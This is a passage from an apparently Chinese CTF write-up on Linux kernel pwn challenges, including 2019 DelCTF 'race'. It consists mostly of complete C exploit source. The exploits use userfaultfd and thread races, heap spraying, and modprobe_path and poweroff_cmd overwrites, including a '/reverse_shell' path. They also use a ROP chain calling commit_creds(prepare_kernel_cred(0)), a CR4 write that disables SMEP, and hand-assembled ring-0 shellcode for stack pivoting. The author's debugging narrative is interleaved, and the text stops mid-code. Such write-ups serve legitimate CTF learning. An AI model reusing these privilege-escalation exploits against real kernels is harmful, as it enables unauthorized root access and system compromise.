memset(user_buf,'\x00',0x20); edit(2,user_buf); if(getuid() == 0)&#123; puts("[:)]root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]not root..."); exit(-1); &#125; return 0;&#125; 解法二：改modprobe_path exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217// gcc -static -pthread xx.c -g -o xx#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;string.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;poll.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;poll.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;stdint.h&gt;#define FAULT_PAGE ((void*)0x1337000)int fd;struct user_chunk&#123; size_t index; size_t size; char * buf;&#125;;struct user_chunk* user_ptr;char user_buf[0x1000];void new(size_t size,char* buf)&#123; user_ptr-&gt;size = size; user_ptr-&gt;buf = buf; if(ioctl(fd,0xffffff00,user_ptr) &lt; 0)&#123; puts("[:(]new error..."); exit(-1); &#125; return;&#125;void show(size_t index,char* buf)&#123; user_ptr-&gt;index = index; user_ptr-&gt;buf = buf; if(ioctl(fd,0xffffff02,user_ptr) &lt; 0)&#123; puts("[:(]show error..."); exit(-1); &#125; return;&#125;void delete()&#123; if(ioctl(fd,0xffffff03,user_ptr) &lt; 0)&#123; puts("[:(]delete error..."); exit(-1); &#125; return;&#125;void edit(size_t index,char* buf)&#123; user_ptr-&gt;index = index; user_ptr-&gt;buf = buf; if(ioctl(fd,0xffffff01,user_ptr) &lt; 0)&#123; puts("[:(]edit error..."); exit(-1); &#125; return;&#125;void* handle(void* uffd)&#123; struct pollfd mypollfd; mypollfd.fd = (unsigned long)uffd; mypollfd.events = POLLIN; int re = poll(&amp;mypollfd,1,-1); if(re &lt;= 0)&#123; puts("[:(]Catch error..."); exit(0); &#125; puts("[:)]I catch it!!!"); delete(); new(0,user_buf); //0 new(0,user_buf); //1 struct uffdio_copy uc; memset(user_buf,'\x00',sizeof(user_buf)); user_buf[8] = 0xf0; uc.src = (unsigned long)user_buf; uc.dst = (unsigned long)FAULT_PAGE; uc.len = 0x1000; uc.mode = 0; if(ioctl(uffd,UFFDIO_COPY,&amp;uc) &lt; 0)&#123; puts("[:(]UFFDIO_COPY error..."); exit(-1); &#125; // 恢复执行copy_from_user puts("[:)]UFFDIO_COPY done!!!"); return;&#125;void register_uffd()&#123; struct uffdio_api myapi; struct uffdio_register myuffd; pthread_t pt; int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); myapi.api = UFFD_API; myapi.features = 0; if(ioctl(uffd,UFFDIO_API,&amp;myapi) == -1)&#123; puts("[:(]Api error..."); exit(-1); &#125; if(mmap(FAULT_PAGE,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0) != FAULT_PAGE)&#123; puts("[:(]mmap error..."); exit(-1); &#125;; myuffd.range.start = FAULT_PAGE; myuffd.range.len = 0x1000; myuffd.mode = UFFDIO_REGISTER_MODE_MISSING; if(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == -1)&#123; puts("[:(]Register error..."); exit(-1); &#125; int re = pthread_create(&amp;pt,NULL,handle,(void*)uffd); if(re != 0)&#123; puts("[:(]Create pthread error..."); exit(-1); &#125;&#125;int main()&#123; fd = open("/dev/note",0); if(fd &lt; 0)&#123; puts("[:(]open error..."); exit(-1); &#125; user_ptr = malloc(0x18); memset(user_buf,'\x00',sizeof(user_buf)); new(0x10,user_buf); //0 register_uffd(); edit(0,FAULT_PAGE); show(1,user_buf); size_t key = *(size_t*)user_buf; printf("[:)]key = %p\n",key); new(0,user_buf); show(1,user_buf); size_t module = *((size_t*)user_buf+2) ^ key; module -= 0x2568; printf("[:)]module = %p\n",module);//------------------------------------------------------------------------------- size_t* tmp_buf = malloc(0x18); size_t offset = module + 0x165; tmp_buf[0] = 0 ^ key; tmp_buf[1] = 4 ^ key; tmp_buf[2] = offset ^ key; edit(1,tmp_buf); size_t page_offset_base_offset = 0; show(2,&amp;page_offset_base_offset); page_offset_base_offset += 0xffffffff00000000; printf("[:)]page_offset_base_offset = %p\n",page_offset_base_offset); tmp_buf[0] = 0 ^ key; tmp_buf[1] = 8 ^ key; tmp_buf[2] = (module + 0x169 + page_offset_base_offset) ^ key; edit(1,tmp_buf); size_t page_offset_base = 0; show(2,&amp;page_offset_base); printf("[:)]page_offset_base = %p\n",page_offset_base);//------------------------------------------------------------------------------- offset = module + 0x1cd; tmp_buf[0] = 0 ^ key; tmp_buf[1] = 4 ^ key; tmp_buf[2] = offset ^ key; edit(1,tmp_buf); prctl(PR_SET_NAME,"xiaoxiaorenwu.."); size_t copy_to_user_offset = 0; show(2,&amp;copy_to_user_offset); copy_to_user_offset += 0xffffffff00000000; printf("[:)]copy_to_user_offset = %p\n",copy_to_user_offset); size_t kernel_base = module + page_offset_base + copy_to_user_offset + 0x1d1 - 0x353ee0; printf("[:)]kernel_base = %p\n",kernel_base); //ffffffff8205e0e0 D modprobe_path size_t modprobe_path = kernel_base + (0xffffffff8205e0e0 - 0xffffffff81000000); tmp_buf[0] = 0 ^ key; tmp_buf[1] = 9 ^ key; tmp_buf[2] = (modprobe_path-page_offset_base) ^ key; edit(1,tmp_buf); strcpy(user_buf,"/xxrw.sh"); edit(2,user_buf); system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' &gt; /xxrw.sh"); system("/bin/chmod +x /xxrw.sh"); system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /trigger"); system("/bin/chmod +x /trigger"); puts("[:)]trigger!!!"); system("/trigger"); return 0;&#125; 解法三：poweroff_cmd &amp;&amp; prctl.hook 失败，貌似改不了prctl.hook。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218// gcc -static -pthread xx.c -g -o xx#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;string.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;poll.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;poll.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;stdint.h&gt;#define FAULT_PAGE ((void*)0x1337000)int fd;struct user_chunk&#123; size_t index; size_t size; char * buf;&#125;;struct user_chunk* user_ptr;char user_buf[0x1000];void new(size_t size,char* buf)&#123; user_ptr-&gt;size = size; user_ptr-&gt;buf = buf; if(ioctl(fd,0xffffff00,user_ptr) &lt; 0)&#123; puts("[:(]new error..."); exit(-1); &#125; return;&#125;void show(size_t index,char* buf)&#123; user_ptr-&gt;index = index; user_ptr-&gt;buf = buf; if(ioctl(fd,0xffffff02,user_ptr) &lt; 0)&#123; puts("[:(]show error..."); exit(-1); &#125; return;&#125;void delete()&#123; if(ioctl(fd,0xffffff03,user_ptr) &lt; 0)&#123; puts("[:(]delete error..."); exit(-1); &#125; return;&#125;void edit(size_t index,char* buf)&#123; user_ptr-&gt;index = index; user_ptr-&gt;buf = buf; if(ioctl(fd,0xffffff01,user_ptr) &lt; 0)&#123; puts("[:(]edit error..."); exit(-1); &#125; return;&#125;void* handle(void* uffd)&#123; struct pollfd mypollfd; mypollfd.fd = (unsigned long)uffd; mypollfd.events = POLLIN; int re = poll(&amp;mypollfd,1,-1); if(re &lt;= 0)&#123; puts("[:(]Catch error..."); exit(0); &#125; puts("[:)]I catch it!!!"); delete(); new(0,user_buf); //0 new(0,user_buf); //1 struct uffdio_copy uc; memset(user_buf,'\x00',sizeof(user_buf)); user_buf[8] = 0xf0; uc.src = (unsigned long)user_buf; uc.dst = (unsigned long)FAULT_PAGE; uc.len = 0x1000; uc.mode = 0; if(ioctl(uffd,UFFDIO_COPY,&amp;uc) &lt; 0)&#123; puts("[:(]UFFDIO_COPY error..."); exit(-1); &#125; // 恢复执行copy_from_user puts("[:)]UFFDIO_COPY done!!!"); return;&#125;void register_uffd()&#123; struct uffdio_api myapi; struct uffdio_register myuffd; pthread_t pt; int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); myapi.api = UFFD_API; myapi.features = 0; if(ioctl(uffd,UFFDIO_API,&amp;myapi) == -1)&#123; puts("[:(]Api error..."); exit(-1); &#125; if(mmap(FAULT_PAGE,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0) != FAULT_PAGE)&#123; puts("[:(]mmap error..."); exit(-1); &#125;; myuffd.range.start = FAULT_PAGE; myuffd.range.len = 0x1000; myuffd.mode = UFFDIO_REGISTER_MODE_MISSING; if(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == -1)&#123; puts("[:(]Register error..."); exit(-1); &#125; int re = pthread_create(&amp;pt,NULL,handle,(void*)uffd); if(re != 0)&#123; puts("[:(]Create pthread error..."); exit(-1); &#125;&#125;int main()&#123; fd = open("/dev/note",0); if(fd &lt; 0)&#123; puts("[:(]open error..."); exit(-1); &#125; user_ptr = malloc(0x18); memset(user_buf,'\x00',sizeof(user_buf)); new(0x10,user_buf); //0 register_uffd(); edit(0,FAULT_PAGE); show(1,user_buf); size_t key = *(size_t*)user_buf; printf("[:)]key = %p\n",key); new(0,user_buf); show(1,user_buf); size_t module = *((size_t*)user_buf+2) ^ key; module -= 0x2568; printf("[:)]module = %p\n",module);//------------------------------------------------------------------------------- size_t* tmp_buf = malloc(0x18); size_t offset = module + 0x165; tmp_buf[0] = 0 ^ key; tmp_buf[1] = 4 ^ key; tmp_buf[2] = offset ^ key; edit(1,tmp_buf); size_t page_offset_base_offset = 0; show(2,&amp;page_offset_base_offset); page_offset_base_offset += 0xffffffff00000000; printf("[:)]page_offset_base_offset = %p\n",page_offset_base_offset); tmp_buf[0] = 0 ^ key; tmp_buf[1] = 8 ^ key; tmp_buf[2] = (module + 0x169 + page_offset_base_offset) ^ key; edit(1,tmp_buf); size_t page_offset_base = 0; show(2,&amp;page_offset_base); printf("[:)]page_offset_base = %p\n",page_offset_base);//------------------------------------------------------------------------------- offset = module + 0x1cd; tmp_buf[0] = 0 ^ key; tmp_buf[1] = 4 ^ key; tmp_buf[2] = offset ^ key; edit(1,tmp_buf); size_t copy_to_user_offset = 0; show(2,&amp;copy_to_user_offset); copy_to_user_offset += 0xffffffff00000000; printf("[:)]copy_to_user_offset = %p\n",copy_to_user_offset); size_t kernel_base = module + page_offset_base + copy_to_user_offset + 0x1d1 - 0x353ee0; printf("[:)]kernel_base = %p\n",kernel_base); //ffffffff8205d940 D poweroff_cmd //ffffffff8131f830 T security_task_prctl size_t poweroff_cmd = kernel_base + (0xffffffff8205d940-0xffffffff81000000); tmp_buf[0] = 0 ^ key; tmp_buf[1] = 15 ^ key; tmp_buf[2] = (poweroff_cmd - page_offset_base) ^ key; edit(1,tmp_buf); strcpy(user_buf,"/reverse_shell"); edit(2,user_buf); size_t prctl_hook = kernel_base + 0xeb0460; size_t poweroff_work_func = kernel_base + 0xad300; tmp_buf[0] = 0 ^ key; tmp_buf[1] = 8 ^ key; tmp_buf[2] = (prctl_hook - page_offset_base) ^ key; edit(1,tmp_buf); edit(2,&amp;poweroff_work_func); //报错 //prctl(PR_SET_NAME,"xiaoxiaorenwu.."); return 0;&#125; 2019DelCTF_race：这道题做的真的难受，最讨厌竞争的题目了，没法调试，只能靠理论和碰撞。开始的竞态读成功了，我本地线程设为8，大概跑二十次能成功一次，设为10的时候成功概率很低。。。设为太小和太大时都成功不了。 然后到O_DIRECT将slub地址写入文件时，又一直打开文件失败，我查了资料说缓冲区大小必须为512的倍数，这也是为什么wp给的buf是用posix_memalign(&amp;buf,512,1024)申请到的，我照做了，然后依然失败，一直返回-1，不知道为啥。。。然后我就想试试普通的写文件，然后mmap映射，然后打开文件是成功的，但是后面会报错。。。。 然后调了一下午也没调好。。。太菜了orz。。。真的难受做的，不像那种可以调试的题，这题根本调试不了啊QAQ，或者是我不会调试。。。先放在这吧。 struck了。。。难受。。。 续：我不是轻言放弃的人！！！又看了一天，终于他妈的本地打通了。。。这题是真的恶心。。我果然太菜了orz。这道题值得好好记录一下。 challenge1：为了搞清楚到底为啥panic，我关了kaslr一步一步地跟，在泄露了slub地址后开始查看内核的内存，把所有用户态喷射的内存的别页面都找到了。。。找了好久，我透： 123456789101112// 0x4000000//0xffff888000200000-0xffff888000400000//0xffff888000e09000-0xffff888001000000//0xffff888001e09000-0xffff888001e0b000//0xffff888001e10000-0xffff888002000000 //0xffff888002950000-0xffff888002a90000//0xffff888002c0d000-0xffff888002c0e000//0xffff888002c10000-0xffff888004c00000//0xffff888005e15000-0xffff888005eef000//0xffff888006800000-0xffff888006a00000//0xffff888006a2e000-0xffff888007800000//0xffff888007c00000-0xffff888007fe0000 target:0xffff888007000000 我们一共喷了0x4000000大小的内存，我们的target_addr在0xffff88807000000，到这里我终于知道了为啥之前panic了，因为我之前只将泄露的地址的后三位清零了，结果其大部分结果为：0xffff88807bxx000，对着地图可见，这个地址并不在喷射范围内。。。所以一直找不到，后来把后六位都清零了后就可以找得到了，但是貌似这并不是panic的原因。。。因为我们可以看到他的报错是：kernel_buf at mm/slub.c，我们这个找不到地址和这个错误明显无关，真正的原因下一步才找到。 challenge2：找到之后，瞬间报错： 我非常疑惑，我明明啥都没干啊。。。为啥又会分配内存？？我猜测报错是在程序返回之后，继续与shell交互时产生的，于是我用getchar在return 0之前卡住： 果然是这样，我们的exp其实没问题，是因为我们竞争写的时候破坏了0x2c0这个size的slab缓冲区，导致shell交互时如果恰好申请0x2c0的内存时就会出错。这也是上一步出错的根本原因。所以我们只要在return之前卡住exp即可。 challenge3：之后就是open(&quot;/dev/ptmx&quot;,2)，我们可以在用户态控制pts，但是和常规的ptmx不同，我调用write时，pts会报错：[ 14.688700] general protection fault: 0000 [#1] SMP PTI，到现在也不知道为啥，求大佬解答orz，总之导致我没办法使用mov rax,rsp;..........pop r12.....push r12;ret;这个gadget，但是ioctl只有rdi和rbp和r14指向tty_struct，我没找到合适的gadget来栈迁移，所以只得用set_memory_x来使内存可执行，因为此时rdi恰好为tty_struct，rsi我们可以控制，所以我们就可以运行ring0态的shellcode了。 challenge4：但是我不会写ring0态的shellcode。。。网上查了一波也没什么结果，比较麻烦的是ring0态没有用户态这么多函数aip，首先提权函数我不知道怎么调用，即使可以调用，我也没法成功返回用户态拿shell，因为我没法布置ireq需要的寄存器，c语言不像python有pwntools库，带有asm功能，c的内联汇编只能作为指令，不能汇编成字符串使用。所以想了一会后，觉得还是只能自己写几个gadget，配合当时寄存器的情况来进行栈迁移，最后还是rop提权比价合适。 因为当时rdi为tty_struct地址，所以我的shellcode为： 1234add rdi,0x500;push rdi;pop rsp;ret; 我已经在tty_struct+0x500处布置好了ropchain，之后就可以rop了。 challenge5：终于，栈被我成功迁移了！！！可以看到我们已经提权成功了，并且ip已经到了get_shell函数里，但是用system开启shell时还是会报错，从显示的错误原因来看应该还是内存申请的问题。 然后我换了用execv来开shell，成功开启shell，并且可以输入ls，id等命令，但是cat flag竟然又崩了。。。orz。 最后我只得改用了orw直接打印flag。。。最后开启kaslr也可以成功，把race_read部分加了个循环，就不用了一直按了，不然太麻烦了hhh。最终效果： 还是太菜了。。调了快一天半。。。 最终exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;memory.h&gt;#include &lt;pty.h&gt;#include &lt;signal.h&gt;#define threadnum 10#define spray_times 1024#define mmap_size 1024*64struct user_chunk&#123; size_t size; char* buf;&#125;;struct user_chunk* user_ptr;int fd;char* mmap_arry[spray_times];int ptmx;size_t commit_creds = 0;size_t prepare_kernel_cred = 0;int show_key;void show(size_t size,char* buf)&#123; user_ptr-&gt;size = size; user_ptr-&gt;buf = buf; if(ioctl(fd,0x23334,user_ptr) &lt; 0)&#123; show_key = 1; return; &#125;&#125;void new(size_t size,char* buf)&#123; user_ptr-&gt;size = size; user_ptr-&gt;buf = buf; if(ioctl(fd,0x23333,user_ptr) &lt; 0)&#123; puts("[:(]new error..."); exit(-1); &#125;&#125;void delete()&#123; if(ioctl(fd,0x23335,user_ptr) &lt; 0)&#123; puts("[:(]delete error..."); exit(-1); &#125;&#125;void race_delete()&#123; delete();&#125;size_t* check()&#123; for(int i = 0;i &lt; spray_times;i++)&#123; unsigned long *p = mmap_arry[i]; int j = 0; while (j &lt; mmap_size/8) &#123; if (p[j] != 0x6161616161616161)&#123; puts("[:)]find it!!!"); printf("[:)]object = %p\n",p[j]); return &amp;p[j]; &#125; j += 0x200; &#125; &#125; return NULL;&#125;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); int fd = open("/flag",O_RDONLY); if(fd &lt; 0)&#123; puts("[:(]open flag error..."); exit(-1); &#125; char* buf = malloc(0x100); memset(buf,'\x00',0x100); read(fd,buf,0x100); printf("[:)]flag is here: %s\n",buf); char* args[2] = &#123;"/bin/sh", NULL&#125;; execv("/bin/sh", args); &#125; else&#123; puts("[:(]Not root..."); exit(0); &#125;&#125;size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;int get_ptmx_slave()&#123; const char *pts_name; if (grantpt(ptmx) &lt; 0 || unlockpt(ptmx) &lt; 0)&#123; puts("[:(]grantpt and unlockpt fail\n"); exit(-1); &#125; pts_name = (const char *)ptsname(ptmx); int fds = open(pts_name, O_RDONLY | O_NOCTTY); if (fds &lt; 0)&#123; puts("[:(]open /dev/ptmx fail\n"); exit(-1); &#125; return fds;&#125;int main()&#123; save(); signal(SIGSEGV,get_shell); pthread_t pt[threadnum]; int t[10]; char* user_buf = malloc(0x1000); size_t slub = 0; char* user_mmap; size_t kernel_offset = 0x106b4e0; size_t kernel_base = 0; for(int i = 0;i &lt; 10;i++) &#123; t[i] = open("/dev/ptmx",O_RDWR); if (t[i] == -1)&#123; puts("[:(]open ptmx error"); exit(-1); &#125; &#125; for (int i = 0;i &lt; 10;i++) close(t[i]);//------------------------------------------------------------------- fd = open("/dev/test",2); if(fd &lt; 0)&#123; puts("[:(]open error..."); exit(-1); &#125; user_ptr = malloc(0x10); memset(user_buf,'\x11',0x1000);start1: new(0x2c0,user_buf);start2: user_mmap = mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); if(user_mmap &lt; 0)&#123; puts("[:(]mmap error..."); exit(-1); &#125; for(int i = 0;i &lt; threadnum;i++)&#123; if(pthread_create(&amp;pt[i],NULL,race_delete,NULL) != 0)&#123; puts("[:(]pthread_create error..."); exit(-1); &#125; &#125; show(7,user_mmap); for(int i = 0;i &lt; threadnum;i++)&#123; pthread_join(pt[i],NULL); &#125; if(show_key == 1)&#123; show_key = 0; goto start1; &#125; slub = *(size_t*)user_mmap; if(slub &lt; 0xff000000000000)&#123; goto start2; &#125; slub = slub | 0xff00000000000000; slub = slub &amp; 0xffffffffff000000; printf("[:)]race success!!!\n[:)]slub = %p\n",slub);//------------------------------------------------------------------------------ for(int i = 0;i &lt; spray_times;i++)&#123; mmap_arry[i] = mmap(NULL,mmap_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); if(mmap_arry[i] &lt; 0)&#123; puts("[:(]mmap error..."); exit(-1); &#125; memset(mmap_arry[i],'a',mmap_size); &#125;//------------------------------------------------------------------------------ // 0x4000000 //0xffff888000200000-0xffff888000400000 //0xffff888000e09000-0xffff888001000000 //0xffff888001e09000-0xffff888001e0b000 //0xffff888001e10000-0xffff888002000000 //0xffff888002950000-0xffff888002a90000 //0xffff888002c0d000-0xffff888002c0e000 //0xffff888002c10000-0xffff888004c00000 //0xffff888005e15000-0xffff888005eef000 //0xffff888006800000-0xffff888006a00000 //0xffff888006a2e000-0xffff888007800000 //0xffff888007c00000-0xffff888007fe0000 target:0xffff888007000000 char *buf = malloc(0x1000); int tmp_fd = open("./data",O_RDWR); if(tmp_fd == -1)&#123; puts("[:(]data_file open error..."); exit(-1); &#125; *(size_t*)buf = slub; if(write(tmp_fd,buf,0x1000) &lt; 0)&#123; puts("[:(]data write error..."); exit(-1); &#125; free(buf);//------------------------------------------------------------------------------ size_t* ret_addr = 0; char* tmp_addr = 0; for(int i = 0;i &lt; 1000;i++)&#123; tmp_addr = mmap(NULL,0x1000,PROT_READ,MAP_PRIVATE,tmp_fd,0); if (tmp_addr == MAP_FAILED)&#123; puts("[:(]data mmap fail..."); exit(-1); &#125; for (int j = 0; j &lt; threadnum; j++)&#123; if(pthread_create(&amp;pt[j],NULL,race_delete,NULL) != 0)&#123; puts("[:(]pthread error..."); exit(-1); &#125; &#125; new(0x2c0,tmp_addr); for (int j = 0; j &lt; threadnum; j++) pthread_join(pt[j],NULL); ptmx = open("/dev/ptmx",O_RDWR); ret_addr = check(); if(ret_addr != NULL)&#123; break; &#125; close(ptmx); &#125; if(ret_addr == 0)&#123; puts("[:(]bad luck..."); exit(0); &#125; close(tmp_fd); kernel_base = ret_addr[3] - kernel_offset; printf("[:)]ret_addr = %p\n",ret_addr); printf("[:)]kernel_base = %p\n", kernel_base); commit_creds = kernel_base + 0x82d30; prepare_kernel_cred = kernel_base + 0x83000; size_t key = kernel_base + 0xC010BC; size_t pop_rdi = kernel_base + 0x139b; size_t mov_cr4 = kernel_base + 0x4f582; size_t leave = kernel_base + 0x1c4570; size_t set_memory_x = kernel_base + 0x55580; //0xffffffff8104f582: mov cr4, rdi; push rdx; popfq; ret; //0xffffffff8100139b: pop rdi; ret; //0xffffffff811c4570: leave; ret; //0xffffffff819fe4e2: mov rdi, rax; mov qword ptr [rdi], 1; ret; //0xffffffff81a09016: swapgs; ret; //0xffffffff81021f52: iretq; ret; int pts = get_ptmx_slave(); ret_addr[3] = slub + 0x300; ret_addr[0x300/8+12] = set_memory_x; ret_addr[0x500/8+0] = pop_rdi; ret_addr[0x500/8+1] = 0x6f0; ret_addr[0x500/8+2] = mov_cr4; ret_addr[0x500/8+3] = pop_rdi; ret_addr[0x500/8+4] = 0; ret_addr[0x500/8+5] = (size_t)prepare_kernel_cred; ret_addr[0x500/8+6] = kernel_base + 0x9fe4e2; ret_addr[0x500/8+7] = (size_t)commit_creds; ret_addr[0x500/8+8] = kernel_base + 0xa09016; ret_addr[0x500/8+9] = kernel_base + 0x21f52; ret_addr[0x500/8+10] = (size_t)get_shell; ret_addr[0x500/8+11] = user_cs; ret_addr[0x500/8+12] = user_rflags; ret_addr[0x500/8+13] = user_rsp; ret_addr[0x500/8+14] = user_ss; ioctl(pts,0x2333,1); char *shellcode = "H\x81\xc7\x00\x05\x00\x00" //add rdi,0x500; "W" //push rdi; "\x5c" //pop rsp; "\xc3"; //ret; ret_addr[0x300/8+12] = slub + 0x400; memcpy((char *)ret_addr+0x400,shellcode,10); ioctl(pts,0x2333,1); puts("[:(]final...."); getchar(); return 0;&#125; 反思：查阅了一番资料，找到了一篇有写ring0提权的shellcode的文章，给出了思路之后，shellcode终于被我凑了出来。。。感觉应该可以通用233。 反思exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;memory.h&gt;#include &lt;pty.h&gt;#include &lt;signal.h&gt;#define threadnum 10#define spray_times 1024#define mmap_size 1024*64struct user_chunk&#123; size_t size; char* buf;&#125;;struct user_chunk* user_ptr;int fd;char* mmap_arry[spray_times];int ptmx;size_t commit_creds = 0;size_t prepare_kernel_cred = 0;int show_key;void show(size_t size,char* buf)&#123; user_ptr-&gt;size = size; user_ptr-&gt;buf = buf; if(ioctl(fd,0x23334,user_ptr) &lt; 0)&#123; show_key = 1; return; &#125;&#125;void new(size_t size,char* buf)&#123; user_ptr-&gt;size = size; user_ptr-&gt;buf = buf; if(ioctl(fd,0x23333,user_ptr) &lt; 0)&#123; puts("[:(]new error..."); exit(-1); &#125;&#125;void delete()&#123; if(ioctl(fd,0x23335,user_ptr) &lt; 0)&#123; puts("[:(]delete error..."); exit(-1); &#125;&#125;void race_delete()&#123; delete();&#125;size_t* check()&#123; for(int i = 0;i &lt; spray_times;i++)&#123; unsigned long *p = mmap_arry[i]; int j = 0; while (j &lt; mmap_size/8) &#123; if (p[j] != 0x6161616161616161)&#123; puts("[:)]find it!!!"); printf("[:)]object = %p\n",p[j]); return &amp;p[j]; &#125; j += 0x200; &#125; &#125; return NULL;&#125;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); int fd = open("/flag",O_RDONLY); if(fd &lt; 0)&#123; puts("[:(]open flag error..."); exit(-1); &#125; char* buf = malloc(0x100); memset(buf,'\x00',0x100); read(fd,buf,0x100); printf("[:)]flag is here: %s\n",buf); char* args[2] = &#123;"/bin/sh", NULL&#125;; execv("/bin/sh", args); &#125; else&#123; puts("[:(]Not root..."); exit(0); &#125;&#125;size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;int get_ptmx_slave()&#123; const char *pts_name; if (grantpt(ptmx) &lt; 0 || unlockpt(ptmx) &lt; 0)&#123; puts("[:(]grantpt and unlockpt fail\n"); exit(-1); &#125; pts_name = (const char *)ptsname(ptmx); int fds = open(pts_name, O_RDONLY | O_NOCTTY); if (fds &lt; 0)&#123; puts("[:(]open /dev/ptmx fail\n"); exit(-1); &#125; return fds;&#125;int main()&#123; save(); signal(SIGSEGV,get_shell); pthread_t pt[threadnum]; int t[10]; char* user_buf = malloc(0x1000); size_t slub = 0; char* user_mmap; size_t kernel_offset = 0x106b4e0; size_t kernel_base = 0; for(int i = 0;i &lt; 10;i++) &#123; t[i] = open("/dev/ptmx",O_RDWR); if (t[i] == -1)&#123; puts("[:(]open ptmx error"); exit(-1); &#125; &#125; for (int i = 0;i &lt; 10;i++) close(t[i]);//------------------------------------------------------------------- fd = open("/dev/test",2); if(fd &lt; 0)&#123; puts("[:(]open error..."); exit(-1); &#125; user_ptr = malloc(0x10); memset(user_buf,'\x11',0x1000);start1: new(0x2c0,user_buf);start2: user_mmap = mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); if(user_mmap &lt; 0)&#123; puts("[:(]mmap error..."); exit(-1); &#125; for(int i = 0;i &lt; threadnum;i++)&#123; if(pthread_create(&amp;pt[i],NULL,race_delete,NULL) != 0)&#123; puts("[:(]pthread_create error..."); exit(-1); &#125; &#125; show(7,user_mmap); for(int i = 0;i &lt; threadnum;i++)&#123; pthread_join(pt[i],NULL); &#125; if(show_key == 1)&#123; show_key = 0; goto start1; &#125; slub = *(size_t*)user_mmap; if(slub &lt; 0xff000000000000)&#123; goto start2; &#125; slub = slub | 0xff00000000000000; slub = slub &amp; 